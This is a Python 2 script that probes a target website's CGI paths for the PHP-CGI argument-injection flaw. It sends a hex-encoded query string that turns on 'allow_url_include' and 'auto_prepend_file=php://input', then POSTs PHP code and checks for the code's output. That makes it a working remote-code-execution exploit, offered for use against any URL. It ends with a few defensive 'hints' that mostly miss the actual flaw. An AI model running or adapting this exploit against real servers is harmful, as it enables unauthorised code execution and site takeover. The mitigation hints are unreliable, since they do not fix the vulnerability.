
import requests
import sys



def scan(target):
    paths = ['/index.php', '/cgi-bin/php', '/cgi-bin/php5', '/cgi-bin/php-cgi', '/cgi-bin/php.cgi', '/cgi-bin/php4', '/phppath/php', '/phppath/php5', '/local-bin/php', '/local-bin/php5']
    for path in paths:
        probe(target, path)

def probe(target, path):
    print "[*] Testing Path: %s" %(path)
    trigger = path + "/?"
    trigger += "%2D%64+%61%6C%6C%6F%77%5F%75%72%"
    trigger += "6C%5F%69%6E%63%6C%75%64%65%3D%6F"
    trigger += "%6E+%2D%64+%73%61%66%65%5F%6D%6F"
    trigger += "%64%65%3D%6F%66%66+%2D%64+%73%75"
    trigger += "%68%6F%73%69%6E%2E%73%69%6D%75%6"
    trigger += "C%61%74%69%6F%6E%3D%6F%6E+%2D%64"
    trigger += "+%64%69%73%61%62%6C%65%5F%66%75%"
    trigger += "6E%63%74%69%6F%6E%73%3D%22%22+%2"
    trigger += "D%64+%6F%70%65%6E%5F%62%61%73%65"
    trigger += "%64%69%72%3D%6E%6F%6E%65+%2D%64+"
    trigger += "%61%75%74%6F%5F%70%72%65%70%65%6"
    trigger += "E%64%5F%66%69%6C%65%3D%70%68%70%"
    trigger += "3A%2F%2F%69%6E%70%75%74+%2D%6E"
    url = target + trigger
    php = """<?php echo "Content-Type:text/html\r\n\r\n"; echo md5('1337x'); ?>"""
    try:
        haxor = requests.post(url, php)
        if "44e902a5aa760d79b76e070fa6725386" in haxor.text:
            print "\n[+]BUG FOUND"
    except Exception:
        print "\n[-]UNKNWON ERROR"

def main(args):
    if len(sys.argv) !=2:
        print "Usage: %s <target>" %(sys.argv[0])
        print "Eg: %s http://lol.com" %(sys.argv[0])
        sys.exit(0)
    target = sys.argv[1]
    print "[+] Target is: %s" %(target)
    scan(target)

if __name__ == "__main__":
    main(sys.argv)


print"\n[+]DID I FIND YOUR WEBSITE CGI VULNRABLE???"
o=raw_input("y or n : ")

if o=='y':
  print"\n[+]DO WANT SOME HINTS TO STOP THIS ATTACK ???"
  v=raw_input("y or n : ")
  if v=='y':
    print"\n[+]STEP 1.  TRY TO KEEP UNCOMMON DIRECTORIES ON YOUR WEBSITE"
    print"\n[+]STEP 2.  MAKE YOUR DATABASE TO READ ONLY"
    print"\n[+]STEP 3.  TRY TO MAKE YOUR WEBSITE DIRECTORY ACCESS BY STATIC IP OR PERSONAL IP"
    print"\n[+}STEP 4.  IF YOU ARE COMPLETLY UNKNOWN TO THIS STUFF...PLEASE EMAIL ME AT nisargjani20996@gmail.com OR CONSULT TO PENTESTERS / IT CONSULTERS"
  else:
    pass
else:
  pass
raw_input("\n[+]PRESS ANY KEY TO EXIT")
